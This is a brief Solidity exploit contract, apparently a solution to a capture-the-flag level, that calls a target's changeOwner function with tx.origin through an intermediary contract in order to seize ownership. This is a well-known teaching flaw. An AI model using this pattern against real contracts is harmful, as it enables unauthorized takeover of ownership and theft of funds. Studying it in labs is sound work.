// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone public target;

    constructor(address targetAddress) {
        target = ITelephone(targetAddress);
    }

    function hack() external payable {
        target.changeOwner(tx.origin);
    }

    fallback() external payable {}
}